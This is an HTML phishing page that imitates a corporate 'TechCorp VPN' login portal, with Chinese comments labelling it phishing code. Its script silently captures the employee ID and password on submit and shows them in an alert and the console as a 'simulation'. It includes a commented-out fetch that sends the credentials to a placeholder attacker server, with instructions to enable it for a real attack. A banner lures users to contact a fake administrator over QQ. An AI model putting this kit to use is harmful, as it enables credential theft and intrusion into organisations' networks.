<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TechCorp VPN Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 50%, #1e3a5f 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .announcement { background: linear-gradient(135deg, #f39c12 0%, #e74c3c 100%); color: white; padding: 10px; overflow: hidden; }
        .announcement marquee { font-weight: bold; }
        .login-container { background: white; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 420px; overflow: hidden; }
        .login-header { background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 100%); padding: 30px; text-align: center; color: white; }
        .login-header h1 { font-size: 1.8em; margin-bottom: 5px; }
        .login-form { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 1em; }
        .btn-login { width: 100%; padding: 14px; background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
        .security-info { background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-top: 20px; }
        .error-message { background: #f8d7da; color: #721c24; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; display: none; }
        .success-message { background: #d4edda; color: #155724; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; display: none; }
        .footer { text-align: center; padding: 20px; background: #f8f9fa; border-top: 1px solid #e9ecef; }
        .footer p { color: #666; font-size: 0.85em; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="announcement">
            <marquee behavior="scroll" direction="left">
                📢 【重要通知】最近VPN连接不稳定，如果出现无法登陆故障，请联系系统管理员QQ: 80302238 | 📢 系统维护通知：本周末将进行系统升级维护，请提前做好准备
            </marquee>
        </div>
        
        <div class="login-header">
            <div style="font-size: 48px; margin-bottom: 10px;">🔐</div>
            <h1>TechCorp VPN Access</h1>
            <p>Secure Remote Access Portal</p>
        </div>
        
        <div class="login-form">
            <div class="error-message" id="errorMsg"></div>
            <div class="success-message" id="successMsg"></div>
            <form id="loginForm" action="/submit" method="POST">
                <div class="form-group">
                    <label for="username">Employee ID</label>
                    <input type="text" id="username" name="username" placeholder="Enter your employee ID" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="btn-login">Connect to VPN</button>
            </form>
            <div class="security-info"><i>⚠️</i>This is a secure corporate network. Unauthorized access is prohibited.</div>
        </div>
        
        <div class="footer"><p>© 2024 TechCorp Enterprise. All rights reserved.</p></div>
    </div>
    
    <script>
        // ========== 钓鱼代码：捕获账号密码并显示（模拟发送） ==========
        // 在实际攻击中，这里的 alert 和 console.log 应该替换为向攻击者服务器发送数据的 fetch 请求
        function captureAndSend(username, password) {
            // 模拟“获得受害者输入的这些信息” —— 在页面上弹出提示，并在控制台输出
            alert('[钓鱼模拟] 已捕获账号: ' + username + ' , 密码: ' + password);
            console.log('=== 钓鱼捕获 ===');
            console.log('账号:', username);
            console.log('密码:', password);
            console.log('时间:', new Date().toISOString());
            // 真实攻击中，取消下面注释，并替换为你的接收服务器地址
            /*
            fetch('https://你的接收服务器地址/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: username, pass: password })
            });
            */
        }

        // 获取表单元素
        var form = document.getElementById('loginForm');
        // 添加一个额外的监听器，不影响原有登录逻辑
        form.addEventListener('submit', function(e) {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            if (username && password) {
                captureAndSend(username, password);
            }
        });
        // ========== 原有登录逻辑完全保留，以下为原始代码 ==========
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (!username || !password) {
                document.getElementById('errorMsg').textContent = 'Please fill in all fields';
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
            }).then(response => response.text()).then(data => {
                if (data.includes('success')) {
                    document.getElementById('successMsg').textContent = 'Authentication successful.';
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('errorMsg').style.display = 'none';
                } else {
                    document.getElementById('errorMsg').textContent = 'Invalid credentials.';
                    document.getElementById('errorMsg').style.display = 'block';
                }
            });
        });
    </script>
</body>
</html>
